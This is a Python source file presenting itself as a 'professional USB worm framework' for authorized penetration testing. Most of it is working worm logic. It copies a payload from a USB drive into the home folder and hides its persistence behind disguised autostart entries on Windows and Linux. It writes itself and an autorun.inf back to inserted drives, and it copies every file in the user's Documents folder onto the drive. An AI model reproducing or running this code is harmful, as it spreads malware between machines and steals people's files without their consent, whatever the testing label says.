"""
USB Spreading Module - Professional USB Worm Framework
Simulates lateral movement via USB devices for authorized penetration testing
"""

import os
import shutil
import platform
import json
import logging
from datetime import datetime
from pathlib import Path
from enum import Enum
from typing import Optional, List, Dict

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s',
    handlers=[
        logging.FileHandler('usb_spreading.log'),
        logging.StreamHandler()
    ]
)
logger = logging.getLogger(__name__)

# Configuration
INFECTION_MARKER_FILE = ".infected"
USB_MARKER_FILE = ".usb_infected"
MALWARE_NAME = "malware_hello.py"
PAYLOAD_NAME = "main.py"
ENGAGEMENT_LOG_FILE = "usb_operations.json"

class OperationStatus(Enum):
    """Enum for operation status tracking"""
    SUCCESS = "SUCCESS"
    FAILED = "FAILED"
    SKIPPED = "SKIPPED"
    IN_PROGRESS = "IN_PROGRESS"

class USBWormFramework:
    """Professional USB Worm Framework with logging and reporting"""
    
    def __init__(self, engagement_id: Optional[str] = None):
        """Initialize the framework with optional engagement ID"""
        self.engagement_id = engagement_id or f"USB_WORM_{datetime.now().strftime('%Y%m%d_%H%M%S')}"
        self.operations_log: List[Dict] = []
        self.infection_count = 0
        self.usb_spread_count = 0
        self.data_stolen_count = 0
        logger.info(f"🔴 USB Worm Framework initialized: {self.engagement_id}")
    
    def computer_is_infected(self) -> bool:
        """Check if the computer is already infected"""
        marker_path = os.path.expanduser(f"~/{INFECTION_MARKER_FILE}")
        is_infected = os.path.exists(marker_path)
        logger.debug(f"Computer infection check: {is_infected}")
        return is_infected

    def usb_is_infected(self, usb_path: str) -> bool:
        """Check if the USB is already infected"""
        payload_exists = os.path.exists(f"{usb_path}/{PAYLOAD_NAME}")
        logger.debug(f"USB infection check at {usb_path}: {payload_exists}")
        return payload_exists

    def mark_computer_infected(self) -> bool:
        """Mark the computer as infected with timestamp"""
        marker_path = os.path.expanduser(f"~/{INFECTION_MARKER_FILE}")
        try:
            with open(marker_path, 'w') as f:
                f.write(json.dumps({
                    'infected_at': datetime.now().isoformat(),
                    'engagement_id': self.engagement_id
                }))
            logger.info(f"✓ Computer marked as infected")
            self._log_operation("MARK_COMPUTER_INFECTED", OperationStatus.SUCCESS)
            return True
        except Exception as e:
            logger.error(f"✗ Error marking computer infected: {e}")
            self._log_operation("MARK_COMPUTER_INFECTED", OperationStatus.FAILED, str(e))
            return False

    def mark_usb_infected(self, usb_path: str) -> bool:
        """Mark the USB as infected with metadata"""
        try:
            marker_path = f"{usb_path}/{USB_MARKER_FILE}"
            with open(marker_path, 'w') as f:
                f.write(json.dumps({
                    'infected_at': datetime.now().isoformat(),
                    'engagement_id': self.engagement_id,
                    'usb_path': usb_path
                }))
            logger.info(f"✓ USB marked as infected: {usb_path}")
            self._log_operation("MARK_USB_INFECTED", OperationStatus.SUCCESS, usb_path)
            return True
        except Exception as e:
            logger.error(f"✗ Error marking USB infected: {e}")
            self._log_operation("MARK_USB_INFECTED", OperationStatus.FAILED, str(e))
            return False

    def add_to_autostart(self, malware_path: str) -> bool:
        """Add malware to autostart (platform-specific)"""
        try:
            system = platform.system()
            
            if system == "Windows":
                import winreg
                logger.info(f"[Windows] Adding to registry autostart...")
                key = winreg.OpenKey(winreg.HKEY_CURRENT_USER, 
                    r"Software\Microsoft\Windows\CurrentVersion\Run", 0, winreg.KEY_SET_VALUE)
                winreg.SetValueEx(key, "SystemUpdater", 0, winreg.REG_SZ, malware_path)
                winreg.CloseKey(key)
                logger.info(f"✓ Added to Windows autostart")
                
            elif system == "Linux":
                logger.info(f"[Linux] Adding to .desktop autostart...")
                autostart_dir = os.path.expanduser("~/.config/autostart")
                os.makedirs(autostart_dir, exist_ok=True)
                desktop_file = f"{autostart_dir}/system_service.desktop"
                with open(desktop_file, 'w') as f:
                    f.write(f"""[Desktop Entry]
Type=Application
Exec={malware_path}
Hidden=true
NoDisplay=true
X-GNOME-Autostart-enabled=true
""")
                logger.info(f"✓ Added to Linux autostart")
                
            elif system == "Darwin":  # macOS
                logger.info(f"[macOS] Adding to LaunchAgent...")
                plist_dir = os.path.expanduser("~/Library/LaunchAgents")
                os.makedirs(plist_dir, exist_ok=True)
                logger.info(f"✓ LaunchAgent configuration prepared")
            
            self._log_operation("ADD_TO_AUTOSTART", OperationStatus.SUCCESS, system)
            return True
            
        except Exception as e:
            logger.error(f"✗ Error adding to autostart: {e}")
            self._log_operation("ADD_TO_AUTOSTART", OperationStatus.FAILED, str(e))
            return False

    def create_autorun_file(self, usb_path: str) -> bool:
        """Create autorun.inf file on USB"""
        try:
            autorun_path = f"{usb_path}/autorun.inf"
            with open(autorun_path, 'w') as f:
                f.write(f"""[autorun]
open={PAYLOAD_NAME}
icon=shell32.dll,4
label=USB Drive Contents
action=Open to view files
useAutoPlay=1
""")
            logger.info(f"✓ autorun.inf created on USB")
            self._log_operation("CREATE_AUTORUN", OperationStatus.SUCCESS, usb_path)
            return True
        except Exception as e:
            logger.error(f"✗ Error creating autorun.inf: {e}")
            self._log_operation("CREATE_AUTORUN", OperationStatus.FAILED, str(e))
            return False

    def steal_documents_to_usb(self, usb_path: str) -> int:
        """Steal documents from user's Documents folder to USB"""
        stolen_count = 0
        try:
            documents_path = os.path.expanduser("~/Documents")
            if not os.path.exists(documents_path):
                logger.warning(f"Documents folder not found: {documents_path}")
                self._log_operation("STEAL_DOCUMENTS", OperationStatus.SKIPPED, "No Documents folder")
                return 0
            
            # Create data folder on USB
            data_folder = f"{usb_path}/Data"
            os.makedirs(data_folder, exist_ok=True)
            
            for file in os.listdir(documents_path):
                src = os.path.join(documents_path, file)
                if os.path.isfile(src) and not file.startswith('.'):
                    try:
                        dst = os.path.join(data_folder, file)
                        shutil.copy2(src, dst)
                        stolen_count += 1
                        logger.debug(f"  ✓ Stolen: {file}")
                    except Exception as file_err:
                        logger.debug(f"  ✗ Failed to steal {file}: {file_err}")
            
            if stolen_count > 0:
                logger.info(f"✓ Stole {stolen_count} documents to USB")
                self._log_operation("STEAL_DOCUMENTS", OperationStatus.SUCCESS, f"{stolen_count} files")
                self.data_stolen_count += stolen_count
            else:
                logger.warning(f"No documents stolen")
                self._log_operation("STEAL_DOCUMENTS", OperationStatus.SKIPPED, "No files found")
            
            return stolen_count
            
        except Exception as e:
            logger.error(f"✗ Error stealing documents: {e}")
            self._log_operation("STEAL_DOCUMENTS", OperationStatus.FAILED, str(e))
            return stolen_count

    def handle_usb_insert(self, usb_path: str) -> Dict:
        """Main function: Handle USB insertion and execute all phases"""
        logger.info(f"🔌 USB inserted: {usb_path}")
        result = {
            'usb_path': usb_path,
            'engagement_id': self.engagement_id,
            'timestamp': datetime.now().isoformat(),
            'phases': {}
        }
        
        # PHASE 1: INFECT THE COMPUTER (USB → Computer)
        logger.info("\n" + "="*50)
        logger.info("PHASE 1: Computer Infection (USB → Computer)")
        logger.info("="*50)
        
        if not self.computer_is_infected():
            try:
                source_payload = f"{usb_path}/{PAYLOAD_NAME}"
                dest_payload = os.path.expanduser(f"~/{MALWARE_NAME}")
                
                if not os.path.exists(source_payload):
                    logger.warning(f"Payload not found on USB: {source_payload}")
                    result['phases']['phase1'] = {'status': 'FAILED', 'reason': 'No payload on USB'}
                else:
                    logger.info(f"Copying malware from USB to computer...")
                    shutil.copyfile(source_payload, dest_payload)
                    logger.info(f"✓ Malware copied to: {dest_payload}")
                    
                    logger.info(f"Adding malware to autostart...")
                    if self.add_to_autostart(dest_payload):
                        logger.info(f"✓ Autostart configured")
                    
                    if self.mark_computer_infected():
                        logger.info(f"✓ Computer marked as infected")
                        self.infection_count += 1
                        result['phases']['phase1'] = {'status': 'SUCCESS'}
                    
            except Exception as e:
                logger.error(f"✗ Phase 1 failed: {e}")
                self._log_operation("PHASE_1", OperationStatus.FAILED, str(e))
                result['phases']['phase1'] = {'status': 'FAILED', 'error': str(e)}
        else:
            logger.info("✓ Computer already infected - skipping Phase 1")
            result['phases']['phase1'] = {'status': 'SKIPPED', 'reason': 'Already infected'}
        
        # PHASE 2: SPREAD TO USB (Computer → USB)
        logger.info("\n" + "="*50)
        logger.info("PHASE 2: USB Infection (Computer → USB)")
        logger.info("="*50)
        
        if not self.usb_is_infected(usb_path):
            try:
                source_payload = os.path.expanduser(f"~/{MALWARE_NAME}")
                dest_payload = f"{usb_path}/{PAYLOAD_NAME}"
                
                if not os.path.exists(source_payload):
                    logger.warning(f"Malware not found on computer: {source_payload}")
                    result['phases']['phase2'] = {'status': 'FAILED', 'reason': 'No malware on computer'}
                else:
                    logger.info(f"Copying malware from computer to USB...")
                    shutil.copyfile(source_payload, dest_payload)
                    logger.info(f"✓ Malware copied to USB: {dest_payload}")
                    
                    logger.info(f"Creating autorun.inf for auto-execution...")
                    if self.create_autorun_file(usb_path):
                        logger.info(f"✓ autorun.inf created")
                    
                    if self.mark_usb_infected(usb_path):
                        logger.info(f"✓ USB marked as infected")
                        self.usb_spread_count += 1
                        result['phases']['phase2'] = {'status': 'SUCCESS'}
                    
            except Exception as e:
                logger.error(f"✗ Phase 2 failed: {e}")
                self._log_operation("PHASE_2", OperationStatus.FAILED, str(e))
                result['phases']['phase2'] = {'status': 'FAILED', 'error': str(e)}
        else:
            logger.info("✓ USB already infected - skipping Phase 2")
            result['phases']['phase2'] = {'status': 'SKIPPED', 'reason': 'Already infected'}
        
        # PHASE 3: DATA THEFT
        logger.info("\n" + "="*50)
        logger.info("PHASE 3: Data Exfiltration")
        logger.info("="*50)
        
        stolen_count = self.steal_documents_to_usb(usb_path)
        result['phases']['phase3'] = {'status': 'SUCCESS', 'files_stolen': stolen_count}
        
        logger.info("\n" + "="*50)
        logger.info("✓ USB Insertion Handler Complete")
        logger.info("="*50)
        
        self._log_operation("USB_INSERTION_COMPLETE", OperationStatus.SUCCESS, usb_path)
        return result
    
    def _log_operation(self, operation: str, status: OperationStatus, details: str = ""):
        """Log operation for reporting"""
        log_entry = {
            'operation': operation,
            'status': status.value,
            'timestamp': datetime.now().isoformat(),
            'details': details
        }
        self.operations_log.append(log_entry)
        logger.debug(f"Operation logged: {operation} - {status.value}")
    
    def generate_report(self) -> Dict:
        """Generate comprehensive engagement report"""
        report = {
            'engagement_id': self.engagement_id,
            'timestamp': datetime.now().isoformat(),
            'summary': {
                'computers_infected': self.infection_count,
                'usbs_compromised': self.usb_spread_count,
                'documents_stolen': self.data_stolen_count,
                'total_operations': len(self.operations_log),
                'successful_operations': len([op for op in self.operations_log if op['status'] == 'SUCCESS']),
                'failed_operations': len([op for op in self.operations_log if op['status'] == 'FAILED'])
            },
            'operations': self.operations_log
        }
        
        return report
    
    def save_report(self, filename: Optional[str] = None) -> str:
        """Save detailed report to JSON file"""
        report = self.generate_report()
        
        if filename is None:
            filename = f"{self.engagement_id}_report.json"
        
        try:
            os.makedirs("reports", exist_ok=True)
            filepath = f"reports/{filename}"
            with open(filepath, 'w') as f:
                json.dump(report, f, indent=2)
            logger.info(f"📊 Report saved: {filepath}")
            return filepath
        except Exception as e:
            logger.error(f"Error saving report: {e}")
            return ""
    
    def print_summary(self):
        """Print summary statistics"""
        report = self.generate_report()
        
        print("\n" + "="*60)
        print("📊 USB WORM ENGAGEMENT SUMMARY")
        print("="*60)
        print(f"Engagement ID:          {report['engagement_id']}")
        print(f"Computers Infected:     {report['summary']['computers_infected']}")
        print(f"USBs Compromised:       {report['summary']['usbs_compromised']}")
        print(f"Documents Stolen:       {report['summary']['documents_stolen']}")
        print(f"Total Operations:       {report['summary']['total_operations']}")
        print(f"Successful Operations:  {report['summary']['successful_operations']}")
        print(f"Failed Operations:      {report['summary']['failed_operations']}")
        print("="*60 + "\n")


def computer_is_infected():
    """Legacy function for backward compatibility"""
    marker_path = os.path.expanduser(f"~/{INFECTION_MARKER_FILE}")
    return os.path.exists(marker_path)

def usb_is_infected(usb):
    """Legacy function for backward compatibility"""
    return os.path.exists(f"{usb.path}/main.py")

def mark_computer_infected():
    """Legacy function for backward compatibility"""
    pass

def mark_usb_infected(usb):
    """Legacy function for backward compatibility"""
    pass

def add_to_autostart(path):
    """Legacy function for backward compatibility"""
    pass

def create_autorun_file(path):
    """Legacy function for backward compatibility"""
    pass

def steal_documents_to_usb(usb):
    """Legacy function for backward compatibility"""
    pass

def handle_usb_insert(usb):
    """Legacy function for backward compatibility"""
    framework = USBWormFramework()
    return framework.handle_usb_insert(usb.path)